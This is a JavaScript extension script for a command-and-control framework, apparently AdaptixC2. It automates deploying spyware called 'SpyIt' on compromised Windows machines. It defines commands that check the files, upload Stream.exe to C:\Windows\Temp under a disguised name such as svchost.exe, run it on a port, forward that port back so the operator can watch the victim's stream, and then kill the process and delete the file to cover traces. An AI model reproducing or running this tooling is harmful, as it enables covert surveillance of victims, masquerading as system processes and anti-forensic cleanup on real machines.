var metadata = {
    name: "SpyIt",
    description: "SpyIt automation - upload and deploy the spyware on target"
};

// ── spyit-check ──
// Verifies all required files exist locally before deploying
var cmd_check = ax.create_command(
    "spyit-check",
    "Check that all required SpyIt files exist locally",
    "spyit-check"
);

cmd_check.setPreHook(function (id, cmdline, parsed_json) {
    var dir = ax.script_dir();
    var files = [
        "Stream.exe",
        "stream.html"
    ];

    var ok = true;
    var msg = "[*] SpyIt file check:\n";
    for (var i = 0; i < files.length; i++) {
        var path = dir + files[i];
        if (ax.file_exists(path)) {
            msg += "  [+] Found: " + files[i] + "\n";
        } else {
            msg += "  [-] MISSING: " + files[i] + "\n";
            ok = false;
        }
    }

    if (!ok) {
        ax.console_message(id, "SpyIt file check failed", "error", msg + "\n[!] Some files are missing. Build Stream.exe first with compile.bat");
        throw new Error("Missing required files");
    }

    ax.console_message(id, "SpyIt file check passed", "success", msg + "\n[+] All files OK. Ready to deploy.");
});

// ── spyit-upload <filename> ──
// Uploads Stream.exe to %TEMP%\<filename> on the target
var cmd_upload = ax.create_command(
    "spyit-upload",
    "Upload Stream.exe to target's %TEMP% with a custom name",
    "spyit-upload <filename>\n  Example: spyit-upload svchost.exe"
);

cmd_upload.setPreHook(function (id, cmdline, parsed_json) {
    var parts = cmdline.trim().split(/\s+/);
    if (parts.length < 2 || parts[1] === "help") {
        throw new Error("Usage: spyit-upload <filename>\n  Example: spyit-upload svchost.exe");
    }

    var filename = parts[1];
    var exe_path = ax.script_dir() + "Stream.exe";

    if (!ax.file_exists(exe_path)) {
        throw new Error("Stream.exe not found at " + exe_path + "\nBuild it first with compile.bat");
    }

    // Upload to C:\Windows\Temp\<filename>
    var remote_path = "C:\\Windows\\Temp\\" + filename;
    ax.execute_alias(id, cmdline, "upload \"" + exe_path + "\" \"" + remote_path + "\"", "SpyIt: upload as " + filename);
});

// ── spyit-start <filename> <port> ──
// Executes the uploaded file on the target with chosen port
var cmd_start = ax.create_command(
    "spyit-start",
    "Run the uploaded SpyIt exe on target with a custom port",
    "spyit-start <filename> <port>\n  Example: spyit-start svchost.exe 40484"
);

cmd_start.setPreHook(function (id, cmdline, parsed_json) {
    var parts = cmdline.trim().split(/\s+/);
    if (parts.length < 3 || parts[1] === "help") {
        throw new Error("Usage: spyit-start <filename> <port>\n  Example: spyit-start svchost.exe 40484");
    }

    var filename = parts[1];
    var port = parts[2];
    var remote_path = "C:\\Windows\\Temp\\" + filename;

    ax.execute_alias(id, cmdline, "ps run " + remote_path + " --port " + port + " --no-detach", "SpyIt: start " + filename + " on port " + port);
});

// ── spyit-connect <remote_port> [local_port] ──
// Creates a local port forward to the target's SpyIt stream
var cmd_connect = ax.create_command(
    "spyit-connect",
    "Create local port forward to SpyIt stream on target",
    "spyit-connect <remote_port> [local_port]\n  Example: spyit-connect 40484\n  Example: spyit-connect 40484 8080"
);

cmd_connect.setPreHook(function (id, cmdline, parsed_json) {
    var parts = cmdline.trim().split(/\s+/);
    if (parts.length < 2 || parts[1] === "help") {
        throw new Error("Usage: spyit-connect <remote_port> [local_port]\n  If local_port is omitted, uses the same as remote_port");
    }

    var remote_port = parts[1];
    var local_port = parts.length >= 3 ? parts[2] : remote_port;

    ax.execute_alias(id, cmdline, "lportfwd start 127.0.0.1 " + local_port + " 127.0.0.1 " + remote_port, "SpyIt: forward server:127.0.0.1:" + local_port + " -> target:127.0.0.1:" + remote_port);
});

// ── spyit-watch <local_port> ──
// Opens the SpyIt stream viewer in the browser
var cmd_watch = ax.create_command(
    "spyit-watch",
    "Open SpyIt stream viewer in browser",
    "spyit-watch <local_port>\n  Example: spyit-watch 40484"
);

cmd_watch.setPreHook(function (id, cmdline, parsed_json) {
    var parts = cmdline.trim().split(/\s+/);
    if (parts.length < 2 || parts[1] === "help") {
        throw new Error("Usage: spyit-watch <local_port>\n  Example: spyit-watch 40484");
    }

    var local_port = parts[1];
    var html_path = ax.script_dir() + "stream.html";
    var url;

    if (ax.file_exists(html_path)) {
        url = "file:///" + html_path.replace(/\\/g, "/") + "?port=" + local_port;
    } else {
        url = "http://127.0.0.1:" + local_port;
    }

    ax.copy_to_clipboard(url);
    ax.show_message("SpyIt Watch", "URL copied to clipboard:\n\n" + url);
});

// ── spyit-terminate <filename> <port> ──
// Stops everything: kills process, stops port forward, deletes the file
var cmd_terminate = ax.create_command(
    "spyit-terminate",
    "Stop SpyIt: kill process, stop port forward, delete file",
    "spyit-terminate <filename> <port>\n  Example: spyit-terminate svchost.exe 40484"
);

cmd_terminate.setPreHook(function (id, cmdline, parsed_json) {
    var parts = cmdline.trim().split(/\s+/);
    if (parts.length < 3 || parts[1] === "help") {
        throw new Error("Usage: spyit-terminate <filename> <port>\n  Example: spyit-terminate svchost.exe 40484");
    }

    var filename = parts[1];
    var port = parts[2];
    var remote_path = "C:\\Windows\\Temp\\" + filename;

    // 1. Stop the port forward
    ax.execute_command(id, "lportfwd stop " + port);

    // 2. Kill the process on target
    ax.execute_command(id, "shell taskkill /f /im " + filename);

    // 3. Delete the file from target
    ax.execute_command(id, "rm " + remote_path);

    ax.console_message(id, "SpyIt: terminate " + filename + " on port " + port, "info", "Sent: lportfwd stop, taskkill, rm");
});

var group_spyit = ax.create_commands_group("SpyIt", [cmd_check, cmd_upload, cmd_start, cmd_connect, cmd_watch, cmd_terminate]);
ax.register_commands_group(group_spyit, ["beacon", "gopher", "kharon"], ["windows"], []);